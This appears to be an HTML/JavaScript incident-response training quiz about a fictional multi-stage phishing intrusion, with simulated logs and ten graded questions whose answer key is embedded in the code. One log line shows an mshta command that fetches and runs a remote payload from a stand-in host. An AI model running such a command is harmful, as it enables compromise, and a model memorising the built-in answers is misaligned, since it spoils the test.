<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Project Nightfall - Advanced Simulation</title>
<style>
  :root { 
    --bg-main: #0a0e17; --bg-panel: #161b22; --border-color: #30363d; --text-primary: #e6edf3;
    --text-secondary: #7d8590; --accent-blue: #58a6ff; --accent-green: #3fb950; --accent-red: #f85149;
    --accent-orange: #f0883e; --font-main: "Segoe UI", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
    --font-mono: "Cascadia Code", "Consolas", "Courier New", monospace;
  }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  * { box-sizing: border-box; }
  body { margin: 0; font-family: var(--font-main); color: var(--text-primary); background-color: var(--bg-main); font-size: 14px; line-height: 1.5; }

  /* Splash Screen (Glassmorphism) */
  #splash-screen {
    display: none; flex-direction: column; align-items: center; justify-content: center;
    position: fixed; inset: 0; z-index: 100; text-align: center; padding: 24px;
    background-color: rgba(16, 22, 30, 0.7); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
    animation: fadeIn 0.5s ease-out;
  }
  #splash-screen.show { display: flex; }
  #splash-screen h1 { font-size: 32px; color: var(--text-primary); margin: 0 0 8px; text-shadow: 0 0 10px #000; }
  #splash-screen p { color: #bdc6d3; max-width: 520px; margin: 0 0 18px; }
  #splash-screen input {
    font-size: 16px; padding: 12px; border-radius: 6px; border: 1px solid var(--border-color);
    background-color: var(--bg-panel); color: var(--text-primary); margin: 12px 0 16px;
    width: 100%; max-width: 320px; text-align: center;
  }
  #splash-screen button {
    font-size: 16px; font-weight: 600; padding: 12px 24px; border-radius: 6px; cursor: pointer;
    border: 1px solid var(--accent-green); background-color: #238636; color: white; transition: all 0.2s;
  }
  #splash-screen button:hover { background-color: #2ea043; box-shadow: 0 0 15px rgba(46, 160, 67, 0.5); }

  header { background-color: var(--bg-panel); border-bottom: 1px solid var(--border-color); padding: 12px 24px; }
  .header-content { max-width: 1600px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
  .header-content h1 { font-size: 18px; margin: 0; font-weight: 600; }
  .timer { font-family: var(--font-mono); font-size: 18px; font-weight: 700; color: var(--accent-orange); }

  main { max-width: 1600px; margin: 24px auto; padding: 0 24px; display: grid; grid-template-columns: 280px 1fr; gap: 24px; }
  .panel { background-color: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; animation: fadeIn 0.5s ease-out; }
  .panel-header { padding: 12px 16px; border-bottom: 1px solid var(--border-color); }
  .panel-header h2 { margin: 0; font-size: 16px; font-weight: 600; }
  .panel-body { padding: 16px; }

  /* Attack Graph */
  .attack-graph { padding: 16px; }
  .graph-container { display: flex; align-items: center; gap: 8px; overflow-x: auto; padding-bottom: 10px; }
  .graph-node { flex-shrink: 0; display: flex; flex-direction: column; align-items: center; gap: 8px; padding: 12px; border-radius: 8px; background: #21262d; border: 1px solid var(--border-color); width: 150px; text-align: center; }
  .graph-node .icon { margin-bottom: 4px; }
  .graph-node .title { font-weight: 600; font-size: 13px; }
  .graph-node .tactic { font-family: var(--font-mono); font-size: 11px; color: var(--accent-orange); }
  .graph-arrow { font-size: 24px; color: var(--text-secondary); }

  /* Log Viewer with line numbers */
  .log-viewer .tabs { display: flex; border-bottom: 1px solid var(--border-color); }
  .tab { padding: 8px 16px; cursor: pointer; background: none; border: none; color: var(--text-secondary); font-weight: 500; border-bottom: 2px solid transparent; }
  .tab.active { color: var(--text-primary); border-bottom-color: var(--accent-blue); }
  .evidence-content { display: none; padding-top: 16px; }
  .evidence-content.active { display: block; }
  .log-entry { font-family: var(--font-mono); font-size: 12px; background: #0a0e17; border: 1px solid var(--border-color); border-radius: 6px; padding: 12px; margin-bottom: 8px; display: flex; gap: 12px; }
  .log-entry .line-num { color: var(--text-secondary); flex-shrink: 0; }
  .log-entry .threat { color: var(--accent-orange); font-weight: 600; }

  /* Left Sidebar: Entities */
  .entity-list { list-style: none; padding: 0; margin: 0; }
  .entity-card { display: flex; align-items: center; gap: 12px; padding: 10px; border-radius: 6px; transition: background-color 0.2s; }
  .entity-card:hover { background-color: #21262d; }
  .entity-info h3 { margin: 0; font-size: 14px; font-weight: 600; }
  .entity-info p { margin: 0; color: var(--text-secondary); font-size: 12px; word-break: break-all; }

  /* Quiz Panel */
  #quiz-panel { position: relative; }
  .progress-bar { width: 100%; height: 4px; background-color: var(--border-color); border-radius: 4px; margin-bottom: 16px; }
  .progress-fill { width: 0%; height: 100%; background-color: var(--accent-blue); border-radius: 4px; transition: width 0.3s ease-out; }
  .q { display: none; animation: fadeIn 0.4s ease-out; }
  .q.active { display: block; }
  .q h3 { margin: 0 0 10px; font-size: 15px; font-weight: 600; }
  .opts { display: grid; gap: 8px; }
  .opt { display: flex; gap: 10px; padding: 12px; border: 1px solid var(--border-color); border-radius: 6px; cursor: pointer; transition: all 0.2s; }
  .opt:hover { background-color: #21262d; border-color: var(--accent-blue); }
  .opt input { margin-top: 3px; }
  
  /* Results */
  .result { margin-top: 20px; }
  .scorebar { height: 8px; background: #374151; border-radius: 16px; overflow: hidden; margin: 8px 0; }
  .scorefill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--accent-red), var(--accent-orange) 50%, var(--accent-green) 100%); transition: width 0.5s ease; }
  .explain { margin-top: 10px; padding: 10px; border-left: 3px solid; border-radius: 4px; background-color: #1f2937; }
  .explain.correct { border-color: var(--accent-green); }
  .explain.incorrect { border-color: var(--accent-red); }
  .hidden { display: none; }
  .pill { display: inline-block; padding: 2px 8px; border-radius: 16px; font-size: 12px; font-weight: 500; }
  .pill.high { background-color: rgba(248, 113, 113, 0.1); color: var(--accent-red); }

  /* Toast Notification */
  .toast {
    visibility: hidden; position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
    background-color: var(--accent-orange); color: #111827; padding: 12px 20px;
    border-radius: 6px; font-weight: 600; z-index: 101;
    opacity: 0; transition: opacity 0.3s, visibility 0.3s;
  }
  .toast.show { visibility: visible; opacity: 1; }
</style>
</head>
<body>
<!-- SVG Icons -->
<svg width="0" height="0" class="hidden"><defs>
  <symbol id="icon-email" viewBox="0 0 20 20" fill="currentColor"><path d="M3 4a2 2 0 00-2 2v1.161l8.441 4.221a1.25 1.25 0 001.118 0L19 7.162V6a2 2 0 00-2-2H3z" /><path d="M19 8.839l-7.77 3.885a2.75 2.75 0 01-2.46 0L1 8.839V14a2 2 0 002 2h14a2 2 0 002-2V8.839z" /></symbol>
  <symbol id="icon-code" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 2a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 0110 2zM5.23 4.23a.75.75 0 011.06 0l1.06 1.06a.75.75 0 01-1.06 1.06L5.23 5.29a.75.75 0 010-1.06zM2 10a.75.75 0 01.75-.75h1.5a.75.75 0 010 1.5h-1.5A.75.75 0 012 10zm3.23 4.77a.75.75 0 010-1.06l1.06-1.06a.75.75 0 111.06 1.06l-1.06 1.06a.75.75 0 01-1.06 0zM10 18a.75.75 0 01-.75-.75v-1.5a.75.75 0 011.5 0v1.5A.75.75 0 0110 18zm4.77-3.23a.75.75 0 01-1.06 0l-1.06-1.06a.75.75 0 011.06-1.06l1.06 1.06a.75.75 0 010 1.06zM18 10a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0118 10zm-3.23-4.77a.75.75 0 010 1.06l-1.06 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0z" clip-rule="evenodd" /></symbol>
  <symbol id="icon-user" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-5.5-2.5a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0zM10 12a5.99 5.99 0 00-4.793 2.39A6.483 6.483 0 0010 16.5a6.483 6.483 0 004.793-2.11A5.99 5.99 0 0010 12z" clip-rule="evenodd" /></symbol>
  <symbol id="icon-server" viewBox="0 0 20 20" fill="currentColor"><path d="M2 3a1 1 0 00-1 1v2a1 1 0 001 1h16a1 1 0 001-1V4a1 1 0 00-1-1H2zm0 8a1 1 0 00-1 1v2a1 1 0 001 1h16a1 1 0 001-1v-2a1 1 0 01-1-1H2z" /><path fill-rule="evenodd" d="M3 5h14v1H3V5zm10 1.25a.75.75 0 000-1.5.75.75 0 000 1.5zM3 13h14v1H3v-1zm10 1.25a.75.75 0 000-1.5.75.75 0 000 1.5z" clip-rule="evenodd" /></symbol>
  <symbol id="icon-ip" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.28 7.22a.75.75 0 00-1.06 1.06L8.94 10l-1.72 1.72a.75.75 0 101.06 1.06L10 11.06l1.72 1.72a.75.75 0 101.06-1.06L11.06 10l1.72-1.72a.75.75 0 00-1.06-1.06L10 8.94 8.28 7.22z" clip-rule="evenodd" /></symbol>
  <symbol id="icon-ad" viewBox="0 0 20 20" fill="currentColor"><path d="M7 4a3 3 0 016 0v1h-1V4a2 2 0 10-4 0v1H7V4z" /><path fill-rule="evenodd" d="M3 8a3 3 0 013-3h8a3 3 0 013 3v8a3 3 0 01-3 3H6a3 3 0 01-3-3V8zm3-1a1 1 0 00-1 1v8a1 1 0 001 1h8a1 1 0 001-1V8a1 1 0 01-1-1H6z" clip-rule="evenodd" /></symbol>
  <symbol id="icon-c2" viewBox="0 0 20 20" fill="currentColor"><path d="M6.28 5.22a.75.75 0 00-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 101.06 1.06L10 11.06l3.72 3.72a.75.75 0 101.06-1.06L11.06 10l3.72-3.72a.75.75 0 00-1.06-1.06L10 8.94 6.28 5.22z" /></symbol>
</defs></svg>

<header>
  <div class="header-content">
    <h1>Project Nightfall - Advanced Simulation</h1>
    <div class="timer" id="timer">Time Remaining: 07:00</div>
  </div>
</header>

<!-- Splash: ask for name AFTER grading -->
<div id="splash-screen">
  <h1 id="splashTitle">Simulation Complete</h1>
  <p>Please enter your name to generate your personalized performance report. The report will be downloaded as a .txt file, and your name will appear on the results screen.</p>
  <input type="text" id="userName" placeholder="Enter Your Name" autocomplete="name">
  <button id="confirmBtn">Confirm & Show Results</button>
</div>

<main id="simulation-content">
  <!-- Left Sidebar: Entities -->
  <aside class="panel">
    <div class="panel-header"><h2>Involved Entities</h2></div>
    <div class="panel-body">
      <ul class="entity-list">
        <li class="entity-card"><svg class="icon" width="24" height="24" style="color:var(--accent-blue)"><use href="#icon-user"></use></svg><div class="entity-info"><h3>User</h3><p>sara.vance</p></div></li>
        <li class="entity-card"><svg class="icon" width="24" height="24" style="color:var(--accent-green)"><use href="#icon-code"></use></svg><div class="entity-info"><h3>Source Device</h3><p>WKSTN-FIN-07</p></div></li>
        <li class="entity-card"><svg class="icon" width="24" height="24" style="color:var(--accent-orange)"><use href="#icon-server"></use></svg><div class="entity-info"><h3>Target Device</h3><p>FS-02</p></div></li>
        <li class="entity-card"><svg class="icon" width="24" height="24" style="color:var(--accent-red)"><use href="#icon-ip"></use></svg><div class="entity-info"><h3>C2 Address</h3><p>198.51.100.23</p></div></li>
      </ul>
    </div>
  </aside>

  <div style="display: flex; flex-direction: column; gap: 24px;">
    <!-- Main Panel: Incident Details -->
    <section class="panel">
      <div class="panel-header">
        <h1>Incident 78523: Multi-Stage Attack</h1>
        <span class="pill high">High Severity</span>
      </div>
      <div class="panel-body">
        <h2>Attack Graph</h2>
        <div class="attack-graph">
          <div class="graph-container">
            <div class="graph-node"><svg class="icon" width="32" height="32" style="color:var(--accent-blue)"><use href="#icon-email"></use></svg><div class="title">Initial Access</div><div class="tactic">TA0001</div></div>
            <div class="graph-arrow">&rarr;</div>
            <div class="graph-node"><svg class="icon" width="32" height="32" style="color:var(--accent-orange)"><use href="#icon-code"></use></svg><div class="title">Execution</div><div class="tactic">TA0002</div></div>
            <div class="graph-arrow">&rarr;</div>
            <div class="graph-node"><svg class="icon" width="32" height="32" style="color:var(--accent-red)"><use href="#icon-c2"></use></svg><div class="title">Command & Control</div><div class="tactic">TA0011</div></div>
            <div class="graph-arrow">&rarr;</div>
            <div class="graph-node"><svg class="icon" width="32" height="32" style="color:var(--accent-red)"><use href="#icon-server"></use></svg><div class="title">Lateral Movement</div><div class="tactic">TA0008</div></div>
            <div class="graph-arrow">&rarr;</div>
            <div class="graph-node"><svg class="icon" width="32" height="32" style="color:var(--accent-orange)"><use href="#icon-ad"></use></svg><div class="title">Discovery</div><div class="tactic">TA0007</div></div>
          </div>
        </div>
        
        <div class="evidence-viewer" style="margin-top:24px;">
          <nav class="tabs" id="evidence-tabs">
            <button class="tab active" data-tab="device-events">Device Events (WKSTN-FIN-07)</button>
            <button class="tab" data-tab="email-details">Email Details</button>
          </nav>
          <div id="device-events" class="evidence-content active">
            <div class="log-entry"><div class="line-num">01</div><div>13:51:22 | User `sara.vance` opened `C:\Users\svance\Downloads\invoice.html`</div></div>
            <div class="log-entry"><div class="line-num">02</div><div class="threat">13:51:23 | `msedge.exe` spawned `mshta.exe http://malicious-host.xyz/payload.hta`</div></div>
            <div class="log-entry"><div class="line-num">03</div><div class="threat">13:51:45 | `mshta.exe` wrote file `C:\Users\svance\AppData\Local\Temp\system-updater.exe`</div></div>
            <div class="log-entry"><div class="line-num">04</div><div class="threat">13:52:10 | `system-updater.exe` created network connection to `198.51.100.23:8080`</div></div>
            <div class="log-entry"><div class="line-num">05</div><div>14:15:05 | `PSEXESVC.exe` service created on remote device `FS-02` from this host.</div></div>
          </div>
          <div id="email-details" class="evidence-content">
            <div class="log-entry"><div class="line-num">01</div><div>From: `accounts@eficorp-billing.com`</div></div>
            <div class="log-entry"><div class="line-num">02</div><div>To: `sara.vance@contoso.com`</div></div>
            <div class="log-entry"><div class="line-num">03</div><div>Subject: Urgent: Unpaid Invoice INV-2025-842</div></div>
            <div class="log-entry"><div class="line-num">04</div><div>Attachment: `invoice.html` (SHA256: 8a2...e4f)</div></div>
            <div class="log-entry"><div class="line-num">05</div><div class="threat">Defender Verdict: Phishing (High Confidence). URLsandDetUrls - Malicious URLs found.</div></div>
          </div>
        </div>
      </div>
    </section>

    <!-- Right Panel: Response & Questions -->
    <section class="panel" id="response-panel">
      <div class="panel-header"><h2>Response & Analysis</h2></div>
      <div class="panel-body">
        <div id="quiz-panel">
          <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
          <div id="questions"></div>
          <div class="result hidden" id="result">
            <h3 id="scoreLine"></h3>
            <div class="scorebar"><div class="scorefill" id="scoreFill"></div></div>
            <p id="passFail"></p>
            <p class="meta" id="participantLine" style="color:var(--text-secondary);"></p>
            <div id="explanations"></div>
          </div>
        </div>
      </div>
    </section>
  </div>
</main>
<div class="toast" id="toast">Warning: Less than 1 minute remaining!</div>

<script>
let timerInterval;
let gradedAnswers = [];
let finalScore = 0;
let finalStatus = '';
let participantNameGlobal = '';
let currentQuestionIndex = 0;

const PASS_THRESHOLD = 70; // Adjusted for higher difficulty
const SIMULATION_TIME = 7 * 60; // 7 minutes in seconds

const QUESTIONS = [
  { id: 1, text: "Which event triggered the initial code execution on the endpoint?", options: ["User `sara.vance` received a phishing email.", "The `system-updater.exe` file connected to a C2 server.", "A malicious URL was automatically loaded by the email client.", "User `sara.vance` opened the `invoice.html` attachment."], correct: 3, explain: "While the email was the delivery mechanism, code execution did not occur until the user opened the HTML attachment, which then called `mshta.exe`. This user action is the critical trigger for the compromise." },
  { id: 2, text: "What is the tactical purpose of using an HTML attachment (`.html`) that calls `mshta.exe`?", options: ["To ensure the payload runs with administrative privileges.", "To deliver a file larger than standard email limits allow.", "To bypass email gateway security that scrutinizes executables and office macros more heavily.", "To execute faster than a typical PowerShell script."], correct: 2, explain: "Attackers use file types like HTA, ISO, and LNK to evade security controls. Email gateways are highly tuned to block `.exe` or macro-enabled documents, but HTML files are often considered less dangerous, making them an effective evasion vector." },
  { id: 3, text: "The file `system-updater.exe` was written to `AppData\\Local\\Temp`. What does this location imply?", options: ["The file requires elevated permissions to run.", "The malware has established kernel-level persistence.", "The malware executed in the context of the standard user without needing admin rights.", "The file is a temporary system update and will be deleted on reboot."], correct: 2, explain: "The `AppData\\Local` directory is a standard, user-specific location where programs can write files without administrative privileges. This indicates the initial payload did not need—or did not achieve—a privilege escalation." },
  { id: 4, text: "Review the containment actions below. What is the correct operational sequence for an active intrusion?", options: ["1. Block C2, 2. Isolate Host, 3. Disable User, 4. Hunt for PsExec", "1. Isolate Host, 2. Disable User, 3. Block C2, 4. Hunt for PsExec", "1. Hunt for PsExec, 2. Isolate Host, 3. Disable User, 4. Block C2", "1. Disable User, 2. Block C2, 3. Isolate Host, 4. Hunt for PsExec"], correct: 1, explain: "The top priority is to stop the active threat. 1. Isolate the host to cut all connections. 2. Disable the user account to prevent credential reuse. 3. Block the C2 IP to prevent other infected hosts from calling out. 4. With containment done, begin threat hunting." },
  { id: 5, text: "Which Microsoft Defender product correlation is essential to view the entire attack chain from inbox to lateral movement?", options: ["Defender for Endpoint and Defender for Identity", "Defender for Office 365 and Defender for Endpoint", "Defender for Cloud Apps and Defender for Endpoint", "Defender for Office 365 and Defender for Cloud"], correct: 1, explain: "Defender for Office 365 sees the initial email (Initial Access), and Defender for Endpoint sees the process execution and lateral movement on the device. Correlating these two provides the end-to-end view." },
  { id: 6, text: "The use of the legitimate tool `PsExec.exe` for lateral movement is an example of which technique?", options: ["Bring Your Own Vulnerable Driver (BYOVD)", "Living Off the Land (LotL)", "Pass-the-Hash (PtH)", "Zero-Day Exploit"], correct: 1, explain: "`PsExec` is a legitimate systems administration tool. When attackers use pre-existing or standard tools to achieve their objectives, it's a 'Living Off the Land' technique designed to blend in with normal network activity." },
  { id: 7, text: "The execution of `AdFind.exe` strongly suggests the attacker's next step is what?", options: ["To find and exfiltrate specific sensitive files from `FS-02`.", "To identify high-value targets like Domain Controllers and privileged accounts for a widespread attack.", "To erase their tracks from the Active Directory logs.", "To create a new domain administrator account for persistence."], correct: 1, explain: "While creating a new admin is possible, `AdFind` is primarily a reconnaissance tool. Its main purpose is to map out the entire domain structure, including trusts, service accounts, and admins, in preparation for a much larger attack like ransomware." },
  { id: 8, text: "You've contained the initial host. What is your most urgent threat hunting query in Sentinel?", options: ["Search for all login attempts by `sara.vance` in the last 24 hours.", "Search for the SHA256 hash of `system-updater.exe` on all devices.", "Search for network connections to the C2 IP `198.51.100.23` from any device.", "Search for new `PSEXESVC.exe` creation events originating from `FS-02`."], correct: 3, explain: "The attacker moved from WKSTN-FIN-07 to FS-02. The most critical question is, where did they go *next*? Hunting for new lateral movement (PsExec) *from* the newly compromised host (FS-02) is the top priority to find the blast radius." },
  { id: 9, text: "Which of these events would represent the highest escalation of this incident?", options: ["The attacker zipping files on `FS-02`.", "The attacker executing `whoami /all` on `FS-02`.", "An anomalous login to a Domain Controller from `FS-02`.", "The `system-updater.exe` C2 connection becoming encrypted."], correct: 2, explain: "Moving from a workstation to a file server is bad, but moving from the file server to a Domain Controller is a 'keys to the kingdom' event. It represents a massive escalation in privilege and potential impact, as the attacker could now control the entire domain." },
  { id: 10, text: "How would you classify this adversary's tradecraft?", options: ["Unsophisticated, using automated commodity malware.", "Advanced, using custom zero-day exploits and fileless malware.", "Highly targeted, focused only on data exfiltration.", "Common and effective, using known 'Living Off the Land' techniques as a precursor to ransomware."], correct: 3, explain: "The entire attack chain uses well-known but effective methods: phishing, HTA for execution, a standard dropper, PsExec for lateral movement, and AdFind for discovery. This is a classic playbook for human-operated ransomware groups, not a simple automated script." }
];

document.addEventListener('DOMContentLoaded', () => {
  renderQuestions();
  setupQuestionListeners();
  startTimer(SIMULATION_TIME);
  updateProgressBar();

  const tabsContainer = document.getElementById('evidence-tabs');
  tabsContainer.addEventListener('click', (e) => {
    if (e.target.tagName === 'BUTTON') {
      tabsContainer.querySelector('.active').classList.remove('active');
      e.target.classList.add('active');
      const targetId = e.target.dataset.tab;
      document.querySelectorAll('.evidence-content').forEach(pane => pane.classList.toggle('active', pane.id === targetId));
    }
  });

  document.getElementById('confirmBtn').addEventListener('click', processResults);
  document.getElementById('userName').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') processResults();
  });
});

function updateProgressBar() {
    const progress = (currentQuestionIndex / QUESTIONS.length) * 100;
    document.getElementById('progress-fill').style.width = `${progress}%`;
}

function setupQuestionListeners() {
    const radioButtons = document.querySelectorAll('#questions input[type="radio"]');
    radioButtons.forEach(radio => {
        radio.addEventListener('change', (e) => {
            const currentQuestion = e.target.closest('.q');
            currentQuestionIndex++;
            updateProgressBar();
            
            setTimeout(() => {
                currentQuestion.classList.remove('active');
                const nextQuestion = currentQuestion.nextElementSibling;
                if (nextQuestion && nextQuestion.classList.contains('q')) {
                    nextQuestion.classList.add('active');
                } else {
                    handleSubmission(false);
                }
            }, 300);
        });
    });
}

function startTimer(duration) {
  let timeLeft = duration;
  const timerEl = document.getElementById('timer');

  timerInterval = setInterval(() => {
    timeLeft--;
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    timerEl.textContent = `Time Remaining: ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    
    if (timeLeft === 59) {
        timerEl.style.color = 'var(--accent-red)';
        const toast = document.getElementById('toast');
        toast.classList.add('show');
        setTimeout(() => { toast.classList.remove('show'); }, 3000);
    }
    
    if (timeLeft <= 0) {
      timerEl.textContent = "Time's Up!";
      handleSubmission(true);
    }
  }, 1000);
}

function handleSubmission(isTimeUp) {
  if (window.simSubmitted) return; 
  window.simSubmitted = true;

  clearInterval(timerInterval);

  let correct = 0;
  gradedAnswers = QUESTIONS.map(q => {
    const chosen = document.querySelector(`input[name="q${q.id}"]:checked`);
    const val = chosen ? parseInt(chosen.value, 10) : -1;
    const isCorrect = val === q.correct;
    if (isCorrect) correct++;
    
    return {
      id: q.id, isCorrect: isCorrect, questionText: q.text,
      userAnswerText: val !== -1 ? q.options[val] : "No Answer",
      correctAnswerText: q.options[q.correct], explanation: q.explain
    };
  });

  finalScore = Math.round((correct / QUESTIONS.length) * 100);
  finalStatus = finalScore >= PASS_THRESHOLD ? 'PASS' : 'NEEDS REVIEW';

  document.body.style.overflow = 'hidden';
  const splash = document.getElementById('splash-screen');
  splash.classList.add('show');
  const title = document.getElementById('splashTitle');
  title.textContent = isTimeUp ? "Time's Up!" : "Simulation Complete";
  document.getElementById('userName').focus();
}

function processResults() {
  let participantName = document.getElementById('userName').value.trim();
  if (participantName === '') {
    participantName = 'Anonymous_Analyst';
  }
  participantNameGlobal = participantName;

  document.getElementById('splash-screen').classList.remove('show');
  document.body.style.overflow = '';
  
  downloadReport(participantNameGlobal);
  showResults();
}

function showResults() {
  const resultPanel = document.getElementById('result');
  const correctCount = gradedAnswers.filter(a => a.isCorrect).length;
  document.getElementById('questions').style.display = 'none';
  document.getElementById('progress-bar').style.display = 'none';

  document.getElementById('scoreLine').textContent = `Final Score: ${finalScore}% (${correctCount}/${QUESTIONS.length})`;
  document.getElementById('participantLine').textContent = `Report generated for: ${participantNameGlobal}`;
  document.getElementById('passFail').innerHTML = finalScore >= PASS_THRESHOLD
    ? `<span style="color:var(--accent-green);">PASS:</span> Excellent analytical skills and correct prioritization of response steps.`
    : `<span style="color:var(--accent-red);">NEEDS REVIEW:</span> Focus on correlating events and identifying the most critical containment actions.`;
  
  requestAnimationFrame(() => { document.getElementById('scoreFill').style.width = `${finalScore}%`; });
  
  document.getElementById('explanations').innerHTML = gradedAnswers.map(e => `
    <div class="explain ${e.isCorrect ? 'correct' : 'incorrect'}">
      <strong>Question ${e.id}: ${e.isCorrect ? 'Correct' : 'Incorrect'}</strong><br>${e.explanation}
    </div>
  `).join('');

  resultPanel.classList.remove('hidden');
  resultPanel.scrollIntoView({ behavior: 'smooth' });
}

function downloadReport(participantName) {
  let reportContent = 'Microsoft Sentinel Simulation Report\n';
  reportContent += '=======================================\n\n';
  reportContent += `Participant: ${participantName}\n`;
  reportContent += `Final Score: ${finalScore}%\n`;
  reportContent += `Status: ${finalStatus}\n\n`;
  reportContent += '--- Question Breakdown ---\n\n';

  gradedAnswers.forEach(answer => {
    reportContent += `Question ${answer.id}: ${answer.questionText}\n`;
    reportContent += `  Your Answer: "${answer.userAnswerText}"\n`;
    reportContent += `  Correct Answer: "${answer.correctAnswerText}"\n`;
    reportContent += `  Result: ${answer.isCorrect ? 'Correct' : 'Incorrect'}\n`;
    reportContent += `  Explanation: ${answer.explanation}\n\n`;
  });

  try {
    const blob = new Blob([reportContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = url;
    a.download = `Simulation_Report_${participantName.replace(/\s+/g, '_')}.txt`;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
  } catch (e) {
    console.error("Download failed:", e);
    alert("There was an error generating the download file.");
  }
}

function renderQuestions() {
  const container = document.getElementById('questions');
  container.innerHTML = QUESTIONS.map((q, idx) => `
    <div class="q ${idx === 0 ? 'active' : ''}" data-question-id="${q.id}">
      <h3>${idx + 1}. ${q.text}</h3>
      <div class="opts">${q.options.map((opt, i) => `
        <label class="opt"><input type="radio" name="q${q.id}" value="${i}"><span>${opt}</span></label>
      `).join('')}</div>
    </div>
  `).join('');
}
</script>

</body>
</html>
